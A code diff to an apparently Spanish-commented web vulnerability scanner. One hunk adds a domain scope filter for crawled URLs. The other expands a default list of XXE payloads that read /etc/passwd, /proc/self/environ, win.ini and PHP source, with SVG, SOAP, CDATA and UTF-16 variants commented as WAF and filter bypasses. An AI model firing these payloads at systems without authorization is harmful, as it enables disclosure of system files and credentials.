@@ -564,11 +564,31 @@ def all_list(urls, c, cl, cr, x, xe, l, s, r, rc, sr, sst, fname, o,
         urip_cl = raw_collected if raw_collected else (urip or [])
         urif_cl = urif or []
 
+        # ── SCOPE FILTER ──────────────────────────────────────────────────────
+        # Filtrar URLs que pertenezcan al dominio target (o sus subdominios).
+        # Evita que links externos encontrados en la crawl (LinkedIn, Google, etc.)
+        # se incluyan en scanners como CRLF, Open Redirect, Host Header, etc.
+        def _target_base_domain(url_str: str) -> str:
+            h = urlparse(url_str).netloc.lower().split(':')[0]
+            parts = h.split('.')
+            return '.'.join(parts[-2:]) if len(parts) >= 2 else h
+
+        _target_bd = _target_base_domain(u)
+
+        def _in_scope(url_str: str) -> bool:
+            return _target_base_domain(url_str) == _target_bd
+
+        urip_cl   = [x for x in urip_cl   if _in_scope(x)]
+        urif_cl   = [x for x in urif_cl   if _in_scope(x)]
+        urip      = [x for x in urip      if _in_scope(x)] if urip else urip
+        urif      = [x for x in urif      if _in_scope(x)] if urif else urif
+        # ─────────────────────────────────────────────────────────────────────
+
         # CRLF: igual que CORS — si no hay ?params ni forms, probar sobre URLs base recolectadas
         crlf_urip = list(urip) if urip else []
         crlf_urif = list(urif) if urif else []
         if not crlf_urip and not crlf_urif and raw_collected:
-            crlf_urip = list(raw_collected)
+            crlf_urip = [x for x in raw_collected if _in_scope(x)]
 
         if not has_param_surface and not raw_collected:
             sys.stdout.write(f'\n\033[1;31m[-] No parameters found for {scope_label}\033[0m\n')
@@ -670,10 +690,26 @@ def all_list(urls, c, cl, cr, x, xe, l, s, r, rc, sr, sst, fname, o,
                 continue
             
             wordlist = payloads if payloads else [
+                # Estructura básica — /etc/passwd (Linux)
                 '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>',
+                # /etc/hosts
                 '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/hosts" >]><foo>&xxe;</foo>',
+                # /proc/self/environ — puede filtrar credenciales de env
                 '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///proc/self/environ" >]><foo>&xxe;</foo>',
-                '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php" >]><foo>&xxe;</foo>'
+                # PHP wrapper base64 — lee código fuente de la app
+                '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php" >]><foo>&xxe;</foo>',
+                # Windows — win.ini
+                '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini" >]><foo>&xxe;</foo>',
+                # /proc/version — fingerprint del kernel
+                '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///proc/version" >]><foo>&xxe;</foo>',
+                # Estructura SVG (parser de imágenes)
+                '<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><image href="file:///etc/passwd"/></svg>',
+                # SOAP envelope con entidad externa
+                '<?xml version="1.0"?><!DOCTYPE data [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"><soapenv:Body><data>&xxe;</data></soapenv:Body></soapenv:Envelope>',
+                # Entidad via CDATA — bypass de WAFs que bloquean &entity;
+                '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo><![CDATA[&xxe;]]></foo>',
+                # UTF-16 encoding — evita filtros de charset
+                '<?xml version="1.0" encoding="UTF-16"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>',
             ]
             # Use authenticated headers for XXE
             scan_headers = custom_headers
